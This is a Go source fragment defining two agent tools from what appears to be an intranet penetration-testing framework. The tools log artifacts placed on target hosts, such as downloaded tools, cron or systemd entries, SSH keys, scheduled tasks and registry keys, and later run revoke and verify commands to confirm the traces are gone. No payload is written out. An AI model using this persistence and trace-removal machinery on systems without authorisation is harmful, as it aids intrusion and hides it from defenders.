		"登记一个手工部署的落地物（例如用 intranet_exec 下载到目标的工具、写入的脚本），必须提供 revoke_command。verify_command 建议按约定打印 JW_ARTIFACT_PRESENT / JW_ARTIFACT_GONE，撤离时据此确认痕迹已消失。台账是撤离清理的唯一依据：凡是留在目标上的东西都要登记。",
		objSchema(map[string]any{
			"session_id":     intranetIntParam("落地物所在会话（建议提供，撤销命令经它执行）"),
			"task_id":        intranetIntParam("归属任务 ID（可选，默认会话归属/当前任务）"),
			"host":           strParam("目标主机（可选，默认取会话主机）"),
			"kind":           strParam("file/cron/systemd/ssh_key/schtasks/registry/other（可选，默认 other）"),
			"name":           strParam("名称（可选）"),
			"path":           strParam("目标路径/标识（可选）"),
			"description":    strParam("说明（可选）"),
			"revoke_command": strParam("撤销命令（必填）"),
			"verify_command": strParam("验证命令（可选，撤销后应输出 JW_ARTIFACT_GONE）"),
			"metadata":       map[string]any{"type": "object", "description": "附加元数据（可选）"},
		}, "revoke_command"),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			var a intranetArtifactRegisterInput
			if err := json.Unmarshal(in, &a); err != nil {
				return actool.Errorf("参数格式错误"), nil
			}
			if strings.TrimSpace(a.RevokeCommand) == "" {
				return actool.Errorf("revoke_command 必填"), nil
			}
			if a.TaskID <= 0 {
				a.TaskID = intranetCtxTaskID(ctx)
			}
			pg, err := s.intranetToolPG()
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			art, err := s.intranetRegisterArtifact(pg, a)
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			return jsonResult(map[string]any{"artifact": art})
		})
}

func (s *Server) toolIntranetArtifactRevoke() actool.CoreTool {
	return wrTool("intranet_artifact_revoke",
		"撤销一条落地物台账记录：执行记录的 revoke_command，再用 verify_command 确认痕迹消失。成功标记 revoked；失败保持 active 并返回证据，可重试。session_id 省略时使用台账绑定的会话（已关闭的会话仍可用于清理）。",
		objSchema(map[string]any{
			"artifact_id": intranetIntParam("落地物 ID（必填）"),
			"session_id":  intranetIntParam("用于执行撤销的会话 ID（可选，默认台账绑定会话）"),
		}, "artifact_id"),
		func(ctx context.Context, in json.RawMessage) (actool.Result, error) {
			var a struct {
				ArtifactID int64 `json:"artifact_id"`
				SessionID  int64 `json:"session_id"`
			}
			if err := json.Unmarshal(in, &a); err != nil {
				return actool.Errorf("参数格式错误"), nil
			}
			if a.ArtifactID <= 0 {
				return actool.Errorf("artifact_id 必填"), nil
			}
			pg, err := s.intranetToolPG()
			if err != nil {
				return actool.Errorf(err.Error()), nil
			}
			art, out, verify, revoked, rerr := s.intranetRevokeArtifact(ctx, pg, a.ArtifactID, a.SessionID)
			res := map[string]any{"artifact": art, "result": out, "verify": verify, "revoked": revoked}
			if rerr != nil {
				res["error"] = rerr.Error()
			}
			return jsonResult(res)
		})
}
